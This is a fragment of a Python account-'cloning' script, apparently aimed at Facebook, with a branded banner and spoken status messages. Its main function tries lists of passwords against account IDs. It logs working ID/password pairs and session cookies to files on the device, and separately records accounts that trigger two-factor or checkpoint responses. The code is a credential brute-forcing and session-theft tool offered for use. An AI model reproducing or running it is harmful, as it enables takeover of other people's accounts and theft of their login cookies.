...
############------[ LOGO ]------#########
os.system('espeak -a 300 "well,come to, @SAJIB CYBER UPTADE METHOD1. CLONING TOOLS11"')
def logo():
...
##     ## ##     ##  ######  ##    ## 
{40*"="} \x1b[1;97m
 [{G}+{W}] AUTHOR   : @SAJIB AHMED11
 [{G}+{W}] GIFT BY   :   @SAJIB AHMED11
 [{G}+{W}] FACEBOOK :@SAJIB AHMED11
 [{G}+{W}] YOU TUBE : @SAJIB AHMED11                       
...
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}@SAJIB AHMED11-GIFT-SCRIPT{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{G}[SAJIB-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/ROOTJAHID-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[SAJIB-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/ROOTJAHID-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[@SAJIB11-GIFT-SCRIPT] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
